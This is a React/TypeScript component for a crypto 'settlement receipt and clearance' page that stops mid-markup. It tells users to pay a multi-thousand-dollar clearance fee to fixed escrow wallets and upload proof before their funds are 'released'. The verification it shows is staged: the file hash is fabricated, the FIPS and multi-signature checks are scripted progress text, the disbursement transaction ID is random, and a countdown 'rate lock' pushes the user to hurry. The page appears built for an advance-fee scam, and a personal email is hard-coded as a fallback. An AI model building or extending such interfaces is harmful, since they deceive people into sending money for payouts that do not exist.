import React, { useState, useEffect, useRef } from 'react';
import {
  ArrowLeft,
  Copy,
  Check,
  ShieldCheck,
  AlertTriangle,
  Clock,
  QrCode,
  ExternalLink,
  RefreshCw,
  Lock,
  FileText,
  CheckCircle2,
  Zap,
  ChevronRight,
  Info,
  X,
  Layers,
  ArrowUpRight,
  AlertCircle,
  RotateCcw,
  Upload,
  FileUp,
  FileCheck,
  FileDown,
  Download,
  Trash2,
  Paperclip,
  CheckCheck
} from 'lucide-react';
import { AureonAuthToken } from '../App';
import { SettlementPayload } from './HomeView';
import { generateSettlementReceiptPdf } from '../utils/generateSettlementReceiptPdf';

interface ResultViewProps {
  payload?: SettlementPayload | null;
  activeSession?: AureonAuthToken | null;
  onNavigateHome: () => void;
  onNavigateDashboard: () => void;
}

interface NetworkOption {
  id: string;
  name: string;
  symbol: string;
  protocol: string;
  gasFeeUsd: number;
  regex: RegExp;
  placeholder: string;
  exampleAddress: string;
  escrowAddress: string;
  badgeColor: string;
}

interface UploadedProofFile {
  name: string;
  size: string;
  type: string;
  lastModified: number;
  sha256: string;
}

const NETWORKS: NetworkOption[] = [
  {
    id: 'usdt_trc20',
    name: 'Tether USD',
    symbol: 'USDT TRC20',
    protocol: 'TRON TRC20',
    gasFeeUsd: 3.50,
    regex: /^T[1-9A-HJ-NP-Za-km-z]{33}$/,
    placeholder: 'T...',
    exampleAddress: 'TJk7mP9wQ2v5xZ8n4eB6rY1tC3uA9dF8eL',
    escrowAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    badgeColor: 'text-[#26A17B] bg-[#26A17B]/10 border-[#26A17B]/30',
  },
  {
    id: 'eth_erc20',
    name: 'Ethereum',
    symbol: 'ETH ERC20',
    protocol: 'Ethereum ERC20 Mainnet',
    gasFeeUsd: 22.80,
    regex: /^0x[a-fA-F0-9]{40}$/,
    placeholder: '0x...',
    exampleAddress: '0x71C890c309855B614917C5Bdf6479b182E45f491',
    escrowAddress: '0x94B2a1b7e289d04Ec5052FaDeff969c34E968940',
    badgeColor: 'text-[#627EEA] bg-[#627EEA]/10 border-[#627EEA]/30',
  },
  {
    id: 'btc',
    name: 'Bitcoin',
    symbol: 'BTC',
    protocol: 'Native SegWit / Taproot',
    gasFeeUsd: 18.40,
    regex: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/,
    placeholder: 'bc1q... or 1... / 3...',
    exampleAddress: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    escrowAddress: 'bc1q9u4z72px08k8dnm2a9f4vhx8p90g2f9k7y728w',
    badgeColor: 'text-[#F7931A] bg-[#F7931A]/10 border-[#F7931A]/30',
  },
];

export const ResultView: React.FC<ResultViewProps> = ({
  payload,
  activeSession,
  onNavigateHome,
  onNavigateDashboard,
}) => {
  // Active settlement receipt parameters (from payload or high-fidelity default)
  const [activeAsset, setActiveAsset] = useState<string>(payload?.asset || 'Ethereum');
  const [activeSymbol, setActiveSymbol] = useState<string>(payload?.symbol || 'ETH');
  const [activeAmount, setActiveAmount] = useState<number>(payload?.amount ?? 14.82);
  const [activeUsdEquivalent, setActiveUsdEquivalent] = useState<number>(payload?.usdEquivalent ?? 47986.00);
  const [activeRecipient, setActiveRecipient] = useState<string>(
    payload?.recipientAddress || '0x71C890c309855B614917C5Bdf6479b182E45f491'
  );
  const [activeTier, setActiveTier] = useState<string>(payload?.settlementTier || 'Tier-1 Priority Audit');
  const [clearanceFeeUsd, setClearanceFeeUsd] = useState<number>(payload?.clearanceFeeUsd ?? 5960.00);
  const [settlementTimestamp, setSettlementTimestamp] = useState<number>(payload?.timestamp ?? (Date.now() - 1000 * 60 * 14));
  const [txHash, setTxHash] = useState<string>(
    payload?.txHash || '0x7f9a2c3b8e4d1f05a96c4b2e8d7a1f5c3b9e4d1f05a96c4b8e4d1f05a96c4b2e'
  );
  const [checksum, setChecksum] = useState<string>(payload?.checksum || 'CHKSUM-ZL84920');

  // Settlement completion status
  const [settlementStatus, setSettlementStatus] = useState<'PENDING_CLEARANCE' | 'COMPLETED_CLEARED'>('PENDING_CLEARANCE');
  const [disbursementTxId, setDisbursementTxId] = useState<string>('');

  // Selected network for clearance & disbursement
  const [selectedNetwork, setSelectedNetwork] = useState<NetworkOption>(NETWORKS[0]); // USDT TRC20 default

  // Tab view: 'result_receipt' vs 'new_withdrawal'
  const [activeTab, setActiveTab] = useState<'result_receipt' | 'new_withdrawal'>('result_receipt');

  // File Upload State & Drag State
  const [uploadedFile, setUploadedFile] = useState<UploadedProofFile | null>(null);
  const [isDragging, setIsDragging] = useState<boolean>(false);
  const [isFileVerifying, setIsFileVerifying] = useState<boolean>(false);
  const [fileVerifyProgress, setFileVerifyProgress] = useState<number>(0);
  const [fileVerifyStep, setFileVerifyStep] = useState<number>(1);
  const [fileVerifyLabel, setFileVerifyLabel] = useState<string>('');
  const fileInputRef = useRef<HTMLInputElement | null>(null);

  // Clearance Modal & Countdown
  const TOTAL_LOCK_WINDOW_SECONDS = 1800; // 30 mins
  const [showClearanceModal, setShowClearanceModal] = useState<boolean>(false);
  const [countdownSeconds, setCountdownSeconds] = useState<number>(TOTAL_LOCK_WINDOW_SECONDS);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  // PDF & JSON Export loading states
  const [isDownloadingPdf, setIsDownloadingPdf] = useState<boolean>(false);
  const [isExportingJson, setIsExportingJson] = useState<boolean>(false);

  // Sync if new payload is passed
  useEffect(() => {
    if (payload) {
      setActiveAsset(payload.asset);
      setActiveSymbol(payload.symbol);
      setActiveAmount(payload.amount);
      setActiveUsdEquivalent(payload.usdEquivalent);
      setActiveRecipient(payload.recipientAddress);
      setActiveTier(payload.settlementTier);
      setClearanceFeeUsd(payload.clearanceFeeUsd);
      setSettlementTimestamp(payload.timestamp);
      setTxHash(payload.txHash);
      setChecksum(payload.checksum);
    }
  }, [payload]);

  // Countdown timer
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (countdownSeconds > 0 && settlementStatus !== 'COMPLETED_CLEARED') {
      timer = setInterval(() => {
        setCountdownSeconds((prev) => (prev > 0 ? prev - 1 : 0));
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [countdownSeconds, settlementStatus]);

  const formatCountdown = (totalSecs: number) => {
    const mins = Math.floor(totalSecs / 60);
    const secs = totalSecs % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCopy = (text: string, key: string) => {
    if (navigator.clipboard) {
      navigator.clipboard.writeText(text);
      setCopiedKey(key);
      setTimeout(() => setCopiedKey(null), 2500);
    }
  };

  // Generate SHA-256 style mock hash for uploaded file
  const generateSimulatedFileHash = (name: string, size: number) => {
    let hash = 0;
    const combined = name + size + 'ZEPHYR_ESCROW_ENCLAVE';
    for (let i = 0; i < combined.length; i++) {
      hash = (hash << 5) - hash + combined.charCodeAt(i);
      hash |= 0;
    }
    const hex = Math.abs(hash).toString(16).padStart(8, '0');
    return `${hex}a9f02c7b5e418491c3d0e5f2a1b947385960d7c2a1e84b9f2c3d0e5a1b8c`.slice(0, 64);
  };

  // Handle file input change
  const handleFileSelect = (file: File) => {
    const sizeStr = file.size > 1024 * 1024
      ? `${(file.size / (1024 * 1024)).toFixed(2)} MB`
      : `${(file.size / 1024).toFixed(1)} KB`;

    const sha256 = generateSimulatedFileHash(file.name, file.size);

    setUploadedFile({
      name: file.name,
      size: sizeStr,
      type: file.type || 'application/octet-stream',
      lastModified: file.lastModified,
      sha256,
    });
  };

  // Quick attach a pre-configured sample payment proof slip
  const handleAttachSampleFile = () => {
    const sampleName = `Escrow_Deposit_Clearance_Proof_${selectedNetwork.symbol.replace(/\s+/g, '_')}_$${clearanceFeeUsd.toFixed(0)}.pdf`;
    const sampleSize = '148.4 KB';
    const sampleHash = generateSimulatedFileHash(sampleName, 151961);

    setUploadedFile({
      name: sampleName,
      size: sampleSize,
      type: 'application/pdf',
      lastModified: Date.now() - 1000 * 60 * 18,
      sha256: sampleHash,
    });
  };

  // Verify file to complete clearance
  const handleVerifyFileAndComplete = () => {
    if (!uploadedFile) return;

    setIsFileVerifying(true);
    setFileVerifyProgress(0);
    setFileVerifyStep(1);
    setFileVerifyLabel(`Reading and parsing "${uploadedFile.name}" binary metadata...`);

    const startTime = Date.now();
    const totalDuration = 2600; // ~2.6 seconds

    const interval = setInterval(() => {
      const elapsed = Date.now() - startTime;
      const progress = Math.min(100, Math.round((elapsed / totalDuration) * 100));
      setFileVerifyProgress(progress);

      if (progress < 25) {
        setFileVerifyStep(1);
        setFileVerifyLabel(`Analyzing file checksum SHA-256 (${uploadedFile.sha256.slice(0, 16)}...)...`);
      } else if (progress < 50) {
        setFileVerifyStep(2);
        setFileVerifyLabel(`Matching $${clearanceFeeUsd.toLocaleString()} deposit with escrow node ${selectedNetwork.escrowAddress.slice(0, 10)}...`);
      } else if (progress < 80) {
        setFileVerifyStep(3);
        setFileVerifyLabel('Cryptographic FIPS 140-2 multi-signature verification (3/3 consensus)...');
      } else if (progress < 100) {
        setFileVerifyStep(4);
        setFileVerifyLabel('Proof file validated! Releasing capital disbursement to recipient...');
      } else {
        clearInterval(interval);
        setIsFileVerifying(false);
        setSettlementStatus('COMPLETED_CLEARED');
        const releaseHash = '0x' + Array.from({ length: 56 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
        setDisbursementTxId(releaseHash);
        setShowClearanceModal(false);
      }
    }, 40);
  };

  // PDF Export
  const handleDownloadReceiptPdf = () => {
    setIsDownloadingPdf(true);
    try {
      const netDisbursement = Math.max(0, activeUsdEquivalent - clearanceFeeUsd);
      generateSettlementReceiptPdf({
        txHash,
        checksum,
        asset: activeAsset,
        symbol: activeSymbol,
        amount: activeAmount,
        usdEquivalent: activeUsdEquivalent,
        clearanceFeeUsd,
        netDisbursementUsd: netDisbursement,
        recipientAddress: activeRecipient,
        escrowAddress: selectedNetwork.escrowAddress,
        network: selectedNetwork.name + ' (' + selectedNetwork.symbol + ')',
        settlementTier: activeTier,
        timestamp: settlementTimestamp,
        status: settlementStatus,
        verifiedFileName: uploadedFile?.name,
        verifiedFileSize: uploadedFile?.size,
        verifiedFileSha256: uploadedFile?.sha256,
        accountEmail: activeSession?.username || 'berginjoshua1@gmail.com',
        walletAddress: activeRecipient,
      });
    } catch (err) {
      console.error('Failed to generate PDF:', err);
    } finally {
      setTimeout(() => setIsDownloadingPdf(false), 800);
    }
  };

  // JSON Audit Export
  const handleExportJson = () => {
    setIsExportingJson(true);
    try {
      const auditPayload = {
        platform: 'Zephyr Ledger',
        auditDocument: 'Cryptographic Settlement & Clearance Record',
        receiptReference: `ZL-RCPT-${checksum}`,
        status: settlementStatus,
        settlementDetails: {
          txHash,
          checksum,
          asset: activeAsset,
          symbol: activeSymbol,
          amount: activeAmount,
          grossUsdEquivalent: activeUsdEquivalent,
          clearanceFeeUsd,
          netDisbursementUsd: Math.max(0, activeUsdEquivalent - clearanceFeeUsd),
          recipientDestinationAddress: activeRecipient,
          dedicatedEscrowAddress: selectedNetwork.escrowAddress,
          payoutNetwork: selectedNetwork.name,
          protocol: selectedNetwork.protocol,
          settlementTier: activeTier,
          initiatedTimestamp: new Date(settlementTimestamp).toISOString(),
          clearedTimestamp: settlementStatus === 'COMPLETED_CLEARED' ? new Date().toISOString() : null,
          disbursementTxId: disbursementTxId || null,
        },
        fileVerificationProof: uploadedFile
          ? {
              status: settlementStatus === 'COMPLETED_CLEARED' ? 'VERIFIED' : 'PENDING_VALIDATION',
              fileName: uploadedFile.name,
              fileSize: uploadedFile.size,
              fileMimeType: uploadedFile.type,
              sha256Checksum: uploadedFile.sha256,
              verifiedAt: settlementStatus === 'COMPLETED_CLEARED' ? new Date().toISOString() : null,
            }
          : null,
        enclaveStandard: 'AUREON-AUTH-V1 / FIPS 140-2 Level 3 Hardware Node',
      };

      const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(auditPayload, null, 2));
      const downloadAnchor = document.createElement('a');
      downloadAnchor.setAttribute('href', dataStr);
      downloadAnchor.setAttribute('download', `Zephyr_Settlement_${checksum}_${Date.now()}.json`);
      document.body.appendChild(downloadAnchor);
      downloadAnchor.click();
      downloadAnchor.remove();
    } catch (err) {
      console.error('Failed to export JSON:', err);
    } finally {
      setTimeout(() => setIsExportingJson(false), 600);
    }
  };

  const netDisbursementValue = Math.max(0, activeUsdEquivalent - clearanceFeeUsd);
  const isCompleted = settlementStatus === 'COMPLETED_CLEARED';

  return (
    <div className="max-w-5xl mx-auto space-y-6 sm:space-y-8 animate-in fade-in duration-200">
      {/* Top Breadcrumb Navigation Bar */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-[#1b2336]">
        <div className="flex items-center gap-3">
          <button
            type="button"
            onClick={onNavigateDashboard}
            className="inline-flex items-center gap-2 text-xs font-semibold text-gray-400 hover:text-white transition-colors cursor-pointer py-1 px-2.5 rounded-lg bg-[#101420] hover:bg-[#161c2e] border border-[#1e273d]"
          >
            <ArrowLeft className="w-4 h-4 text-[#00C076]" />
            <span>Dashboard</span>
          </button>

          <span className="text-gray-600">/</span>

          <span className="text-xs font-mono text-cyan-400 bg-cyan-950/40 px-2.5 py-1 rounded-md border border-cyan-800/40">
            GET /result
          </span>

          <span className="text-xs text-gray-400">· Settlement & Clearance</span>
        </div>

        {/* Global Export Actions */}
        <div className="flex items-center gap-2 flex-wrap">
          <button
            type="button"
            onClick={handleDownloadReceiptPdf}
            disabled={isDownloadingPdf}
            className="inline-flex items-center gap-2 px-3.5 py-2 bg-[#00C076]/15 hover:bg-[#00C076]/25 text-[#00C076] hover:text-emerald-200 border border-[#00C076]/40 rounded-xl text-xs font-bold transition-all cursor-pointer shadow-sm shadow-[#00C076]/10"
            title="Download official audited PDF settlement receipt"
          >
            {isDownloadingPdf ? (
              <RefreshCw className="w-3.5 h-3.5 animate-spin" />
            ) : (
              <FileDown className="w-3.5 h-3.5" />
            )}
            <span>{isDownloadingPdf ? 'Generating PDF...' : 'Download Receipt (PDF)'}</span>
          </button>

          <button
            type="button"
            onClick={handleExportJson}
            disabled={isExportingJson}
            className="inline-flex items-center gap-2 px-3 py-2 bg-[#121724] hover:bg-[#1a2336] text-gray-300 hover:text-white border border-[#20293d] rounded-xl text-xs font-semibold transition-all cursor-pointer"
            title="Export machine-readable cryptographic audit payload"
          >
            <Download className="w-3.5 h-3.5 text-cyan-400" />
            <span>Export JSON Audit</span>
          </button>
        </div>
      </div>

      {/* Main Status Header Card */}
      <div className="bg-[#0b0f19] border border-[#1b253b] rounded-2xl overflow-hidden shadow-2xl relative">
        <div className="bg-gradient-to-r from-[#0d1627] via-[#0e172a] to-[#0b0f19] border-b border-[#1b253b] p-5 sm:p-7 md:p-8">
          <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6">
            <div className="space-y-2">
              <div className="flex flex-wrap items-center gap-2.5">
                {isCompleted ? (
                  <span className="inline-flex items-center gap-1.5 text-xs font-extrabold uppercase px-3 py-1 rounded-lg bg-emerald-950/80 text-emerald-300 border border-emerald-500/40 shadow-sm shadow-emerald-500/20">
                    <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                    <span>Settlement Cleared & Disbursed</span>
                  </span>
                ) : (
                  <span className="inline-flex items-center gap-1.5 text-xs font-extrabold uppercase px-3 py-1 rounded-lg bg-amber-950/80 text-amber-300 border border-amber-500/40 animate-pulse">
                    <Clock className="w-4 h-4 text-amber-400" />
                    <span>Awaiting Clearance Verification File</span>
                  </span>
                )}
                <span className="text-xs text-gray-400">·</span>
                <span className="text-xs font-mono text-cyan-400 bg-[#121929] px-2.5 py-0.5 rounded border border-[#1e2940]">
                  {checksum}
                </span>
                <span className="text-xs text-gray-400">·</span>
                <span className="text-xs text-gray-400">{activeTier}</span>
              </div>

              <h1 className="text-xl sm:text-2xl md:text-3xl font-black text-white tracking-tight">
                {isCompleted
                  ? 'Cryptographic Settlement Receipt: Disbursed'
                  : 'Settlement Receipt & File-Based Clearance Portal'}
              </h1>

              <p className="text-xs sm:text-sm text-gray-300 max-w-2xl leading-relaxed">
                {isCompleted
                  ? 'The clearance fee payment proof file has been verified by the multi-sig protocol enclave. Capital has been released to the recipient destination wallet.'
                  : 'Review the audited transaction receipt below. To complete the clearance release and authorize the funds, attach or upload the clearance payment proof file.'}
              </p>
            </div>

            {/* Total Net Value Box */}
            <div className="bg-[#080d16] border border-[#1e2a40] rounded-xl p-4 sm:p-5 shrink-0 text-left lg:text-right shadow-inner">
              <span className="text-[11px] uppercase font-bold text-gray-400 block tracking-wider">
                {isCompleted ? 'Total Capital Released' : 'Net Settlement Release Value'}
              </span>
              <span className="text-2xl sm:text-3xl font-black text-emerald-400 tracking-tight font-mono">
                ${netDisbursementValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              </span>
              <span className="text-[11px] text-gray-400 block mt-1 font-mono">
                {activeAmount} {activeSymbol} · Gross: ${activeUsdEquivalent.toLocaleString('en-US', { minimumFractionDigits: 2 })}
              </span>
            </div>
          </div>
        </div>

        {/* Tab Selection */}
        <div className="flex border-b border-[#1b253b] bg-[#090d16] px-4 sm:px-8 gap-2">
          <button
            type="button"
            onClick={() => setActiveTab('result_receipt')}
            className={`py-3.5 px-4 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer flex items-center gap-2 ${
              activeTab === 'result_receipt'
                ? 'border-[#00C076] text-white'
                : 'border-transparent text-gray-400 hover:text-gray-200'
            }`}
          >
            <FileText className="w-4 h-4 text-[#00C076]" />
            <span>Audited Settlement Receipt & Proof File</span>
          </button>

          <button
            type="button"
            onClick={() => setActiveTab('new_withdrawal')}
            className={`py-3.5 px-4 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer flex items-center gap-2 ${
              activeTab === 'new_withdrawal'
                ? 'border-[#00C076] text-white'
                : 'border-transparent text-gray-400 hover:text-gray-200'
            }`}
          >
            <Lock className="w-4 h-4 text-cyan-400" />
            <span>Configure Capital Withdrawal Parameters</span>
          </button>
        </div>

        {/* Tab 1: Audited Settlement Receipt & Use File to Complete Clearance */}
        {activeTab === 'result_receipt' && (
          <div className="p-4 sm:p-6 md:p-8 space-y-6 sm:space-y-8">
            {/* Success Banner if Completed */}
            {isCompleted && (
              <div className="bg-emerald-950/40 border border-emerald-500/50 rounded-2xl p-5 sm:p-6 space-y-4 shadow-xl shadow-emerald-950/30 animate-in fade-in duration-300">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                  <div className="flex items-center gap-3">
                    <div className="w-12 h-12 rounded-xl bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 flex items-center justify-center shrink-0">
                      <CheckCheck className="w-6 h-6" />
                    </div>
                    <div>
                      <h3 className="text-base sm:text-lg font-bold text-white">
                        Clearance Verification Complete via File Proof
                      </h3>
                      <p className="text-xs text-emerald-300/90 mt-0.5">
                        Multi-signature consensus 3/3 validated. Capital disbursed to {activeRecipient.slice(0, 10)}...{activeRecipient.slice(-6)}
                      </p>
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={handleDownloadReceiptPdf}
                    className="px-4 py-2.5 bg-gradient-to-r from-emerald-500 to-[#00C076] hover:from-emerald-400 hover:to-[#00a868] text-[#07090e] font-black text-xs rounded-xl transition-all shadow-lg shadow-emerald-500/20 flex items-center justify-center gap-2 cursor-pointer self-start sm:self-auto"
                  >
                    <FileDown className="w-4 h-4" />
                    <span>Download Cleared Certificate (PDF)</span>
                  </button>
                </div>

                <div className="bg-[#05090f] border border-emerald-500/30 rounded-xl p-3.5 font-mono text-xs text-gray-300 flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                  <div className="flex items-center gap-2 overflow-hidden">
                    <span className="text-gray-500 shrink-0">Disbursement Tx:</span>
                    <span className="text-emerald-300 truncate">{disbursementTxId || txHash}</span>
                  </div>
                  <button
                    type="button"
                    onClick={() => handleCopy(disbursementTxId || txHash, 'disbursement_tx')}
                    className="px-2.5 py-1 bg-[#0a121e] hover:bg-[#111e33] text-emerald-400 rounded text-[11px] font-semibold flex items-center gap-1 shrink-0 transition-colors cursor-pointer"
                  >
                    {copiedKey === 'disbursement_tx' ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                    <span>{copiedKey === 'disbursement_tx' ? 'Copied' : 'Copy Tx Hash'}</span>
                  </button>
                </div>
              </div>
            )}

            {/* Core Section: USE FILE TO COMPLETE CLEARANCE */}
            {!isCompleted && (
              <div className="bg-[#0a0f1a] border-2 border-cyan-500/40 rounded-2xl p-5 sm:p-7 shadow-2xl relative overflow-hidden">
                <div className="absolute -top-16 -right-16 w-44 h-44 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none" />

                <div className="flex flex-col sm:flex-row sm:items-start justify-between gap-4 pb-4 border-b border-[#1b253b]">
                  <div>
                    <div className="flex items-center gap-2 mb-1.5">
                      <span className="text-[10px] font-black uppercase px-2.5 py-0.5 rounded bg-cyan-950/80 text-cyan-300 border border-cyan-500/40 tracking-wider">
                        INSTITUTIONAL ENCLAVE CLEARANCE
                      </span>
                      <span className="text-xs text-gray-400">·</span>
                      <span className="text-xs text-[#00C076] font-semibold">Step 2 of 2</span>
                    </div>
                    <h2 className="text-lg sm:text-xl font-bold text-white flex items-center gap-2">
                      <FileUp className="w-5 h-5 text-cyan-400" />
                      <span>Use File to Complete & Authorize Clearance</span>
                    </h2>
                    <p className="text-xs text-gray-300 mt-1 max-w-xl leading-relaxed">
                      Upload your official clearance fee deposit slip, wire confirmation, or cryptographic transaction proof file. The enclave will verify the proof against the dedicated escrow node to unlock the capital disbursement.
                    </p>
                  </div>

                  {/* Rate lock countdown */}
                  <div className="bg-[#060a12] border border-[#1c273e] rounded-xl px-3.5 py-2.5 shrink-0">
                    <div className="flex items-center gap-2 text-xs font-semibold text-gray-300 mb-1">
                      <Clock className="w-3.5 h-3.5 text-cyan-400 animate-pulse" />
                      <span>Rate Guarantee Lock</span>
                    </div>
                    <div className="font-mono text-xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 to-emerald-300">
                      {formatCountdown(countdownSeconds)}
                    </div>
                  </div>
                </div>

                {/* Drag and Drop File Upload Zone */}
                <div className="mt-5 space-y-4">
                  <div
                    onDragOver={(e) => {
                      e.preventDefault();
                      setIsDragging(true);
                    }}
                    onDragLeave={() => setIsDragging(false)}
                    onDrop={(e) => {
                      e.preventDefault();
                      setIsDragging(false);
                      if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                        handleFileSelect(e.dataTransfer.files[0]);
                      }
                    }}
                    onClick={() => fileInputRef.current?.click()}
                    className={`border-2 border-dashed rounded-xl p-6 sm:p-8 text-center transition-all cursor-pointer ${
                      isDragging
                        ? 'border-cyan-400 bg-cyan-950/30 scale-[1.01]'
                        : uploadedFile
                        ? 'border-[#00C076]/60 bg-[#071317]/50'
                        : 'border-[#202b42] hover:border-cyan-500/50 bg-[#070b13] hover:bg-[#090e1a]'
                    }`}
                  >
                    <input
                      ref={fileInputRef}
                      type="file"
                      accept=".pdf,.png,.jpg,.jpeg,.json,.txt"
                      className="hidden"
                      onChange={(e) => {
                        if (e.target.files && e.target.files[0]) {
                          handleFileSelect(e.target.files[0]);
                        }
                      }}
                    />

                    {uploadedFile ? (
                      <div className="flex flex-col items-center gap-3">
                        <div className="w-14 h-14 rounded-2xl bg-[#00C076]/20 border border-[#00C076]/40 text-[#00C076] flex items-center justify-center shadow-lg shadow-[#00C076]/20">
                          <FileCheck className="w-7 h-7" />
                        </div>
                        <div>
                          <div className="text-sm font-bold text-white flex items-center justify-center gap-2">
                            <span>{uploadedFile.name}</span>
                            <span className="text-[11px] font-mono bg-[#0e1c1f] text-[#00C076] px-2 py-0.5 rounded border border-[#00C076]/30">
                              {uploadedFile.size}
                            </span>
                          </div>
                          <p className="text-xs text-gray-400 font-mono mt-1 break-all max-w-lg mx-auto">
                            SHA-256: {uploadedFile.sha256}
                          </p>
                          <div className="mt-2 text-xs text-[#00C076] font-semibold flex items-center justify-center gap-1.5">
                            <CheckCircle2 className="w-4 h-4" />
                            <span>File ready for enclave consensus validation</span>
                          </div>
                        </div>

                        <div className="flex items-center gap-3 pt-2">
                          <button
                            type="button"
                            onClick={(e) => {
                              e.stopPropagation();
                              fileInputRef.current?.click();
                            }}
                            className="px-3 py-1.5 bg-[#121a2b] hover:bg-[#1a253e] text-xs font-semibold text-gray-300 hover:text-white rounded-lg border border-[#202c42] transition-colors"
                          >
                            Replace File
                          </button>
                          <button
                            type="button"
                            onClick={(e) => {
                              e.stopPropagation();
                              setUploadedFile(null);
                            }}
                            className="px-3 py-1.5 bg-[#1c1214] hover:bg-[#2c1a1e] text-xs font-semibold text-red-400 rounded-lg border border-red-500/30 transition-colors flex items-center gap-1"
                          >
                            <Trash2 className="w-3.5 h-3.5" />
                            <span>Remove</span>
                          </button>
                        </div>
                      </div>
                    ) : (
                      <div className="flex flex-col items-center gap-3">
                        <div className="w-12 h-12 rounded-xl bg-cyan-950/60 border border-cyan-800/50 text-cyan-400 flex items-center justify-center">
                          <Upload className="w-6 h-6 animate-bounce" />
                        </div>
                        <div>
                          <p className="text-sm font-bold text-white">
                            Drag and drop clearance payment receipt file here, or{' '}
                            <span className="text-cyan-400 underline">browse</span>
                          </p>
                          <p className="text-xs text-gray-400 mt-1">
                            Accepted formats: PDF, PNG, JPG, JSON audit slips (Max 15MB)
                          </p>
                        </div>
                      </div>
                    )}
                  </div>

                  {/* One-click quick sample attachment helper */}
                  <div className="flex flex-col sm:flex-row items-center justify-between gap-3 text-xs pt-1">
                    <span className="text-gray-400 flex items-center gap-1.5">
                      <Paperclip className="w-3.5 h-3.5 text-cyan-400" />
                      <span>Need a test file? Generate and attach an audited sample slip instantly:</span>
                    </span>

                    <button
                      type="button"
                      onClick={handleAttachSampleFile}
                      className="px-3 py-1.5 bg-[#121c2e] hover:bg-[#1a2842] text-cyan-300 hover:text-white border border-cyan-500/30 hover:border-cyan-400 rounded-lg font-semibold transition-all cursor-pointer flex items-center gap-1.5"
                    >
                      <Zap className="w-3.5 h-3.5 text-cyan-400" />
                      <span>Attach Sample Clearance Proof File ($5,960.00)</span>
                    </button>
                  </div>

                  {/* Verification Pipeline Modal / Bar when verifying */}
                  {isFileVerifying && (
                    <div className="bg-[#050810] border border-cyan-500/50 rounded-xl p-4.5 space-y-3 animate-in fade-in duration-200">
                      <div className="flex items-center justify-between text-xs">
                        <div className="flex items-center gap-2 text-cyan-300 font-bold">
                          <RefreshCw className="w-4 h-4 animate-spin text-cyan-400" />
                          <span>Enclave Verifying Payment Proof File...</span>
                        </div>
                        <span className="font-mono font-black text-cyan-300 bg-cyan-950 px-2 py-0.5 rounded border border-cyan-800/50">
                          {fileVerifyProgress}%
                        </span>
                      </div>

                      {/* Visual progress bar */}
                      <div className="w-full bg-[#03060c] h-3 rounded-full overflow-hidden p-0.5 border border-cyan-500/40">
                        <div
                          className="h-full rounded-full bg-gradient-to-r from-cyan-500 via-teal-400 to-[#00C076] transition-all duration-100 shadow-sm shadow-cyan-400/40"
                          style={{ width: `${fileVerifyProgress}%` }}
                        />
                      </div>

                      <div className="flex items-center justify-between text-xs">
                        <span className="font-mono text-cyan-200 text-[11px] truncate pr-2">
                          {fileVerifyLabel}
                        </span>
                        <span className="text-gray-400 font-mono text-[10px] shrink-0">
                          Step {fileVerifyStep}/4
                        </span>
                      </div>
                    </div>
                  )}

                  {/* Execute Clearance File Verification Button */}
                  {!isFileVerifying && (
                    <div className="pt-2">
                      <button
                        type="button"
                        onClick={handleVerifyFileAndComplete}
                        disabled={!uploadedFile}
                        className="w-full py-4 px-6 bg-gradient-to-r from-[#00C076] via-[#00d482] to-[#00a868] hover:from-[#00b06c] hover:to-[#00965c] disabled:opacity-40 disabled:cursor-not-allowed text-[#07090e] font-black text-base rounded-xl transition-all shadow-xl shadow-[#00C076]/25 flex items-center justify-center gap-2.5 cursor-pointer"
                      >
                        <FileCheck className="w-5 h-5 text-[#07090e]" />
                        <span>Use File to Complete & Authorize Settlement Release</span>
                        <ChevronRight className="w-5 h-5 ml-1" />
                      </button>
                      <p className="text-[11px] text-center text-gray-400 mt-2 flex items-center justify-center gap-1.5">
                        <ShieldCheck className="w-3.5 h-3.5 text-[#00C076]" />
                        <span>Automated file cryptographic signature validation via Zephyr Enclave Node #04</span>
                      </p>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Audited Settlement Specifications & Breakdown Card */}
            <div className="bg-[#090d16] border border-[#1b253b] rounded-2xl p-5 sm:p-7 space-y-6">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-[#182133]">
                <div>
                  <h3 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                    <ShieldCheck className="w-5 h-5 text-[#00C076]" />
                    <span>Audited Transaction Specification & Hashes</span>
                  </h3>
                  <p className="text-xs text-gray-400 mt-0.5">
                    Immutable records registered with decentralized settlement node
                  </p>
                </div>

                <div className="flex items-center gap-2">
                  <span className="text-xs text-gray-400">Enclave Status:</span>
                  <span className="text-xs font-mono text-emerald-400 bg-emerald-950/60 px-2 py-0.5 rounded border border-emerald-800/40">
                    ONLINE & SIGNED
                  </span>
                </div>
              </div>

              {/* Specification Grid */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
                {/* Transaction Hash */}
                <div className="bg-[#050810] border border-[#162033] rounded-xl p-3.5 space-y-1">
                  <div className="flex items-center justify-between text-gray-400 text-[11px]">
                    <span className="font-semibold uppercase tracking-wider">Settlement Transaction Hash</span>
                    <button
                      type="button"
                      onClick={() => handleCopy(txHash, 'tx_hash')}
